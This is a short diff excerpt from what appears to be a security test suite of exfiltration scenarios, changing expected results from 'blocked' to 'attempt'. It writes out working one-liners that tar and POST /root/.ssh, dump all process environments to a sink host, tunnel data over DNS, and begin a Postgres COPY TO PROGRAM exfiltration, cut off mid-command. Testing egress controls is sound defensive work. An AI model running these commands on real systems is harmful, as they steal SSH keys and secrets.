@@ -224,12 +224,12 @@ dig +time=2 +tries=1 @8.8.8.8 "${hex:0:60}.tunnel2.rt-l4.test" TXT || true
 
 keys("keys-05-ssh-dir", "Archive ~/.ssh and POST it", """
 tar czf - /root/.ssh 2>/dev/null | base64 -w0 | curl -s -m 5 --data-binary @- "http://$SINK_IP:8080/ssh" || true
-""", [ip_blocked(8080), VOUT])
+""", [ip_attempt(8080), VOUT])
 
 keys("keys-06-proc-environ", "Dump every process environment, POST it", """
 cat /proc/[0-9]*/environ 2>/dev/null | tr '\\0' '\\n' | curl -s -m 5 --data-binary @- "http://$SINK_IP:8080/env" \
   || true
-""", [ip_blocked(8080), VOUT])
+""", [ip_attempt(8080), VOUT])
 
 keys("keys-07-postgres-copy-program", "Exfiltrate through Postgres (COPY ... TO PROGRAM)", """
 psql -X -q -d shop -c \
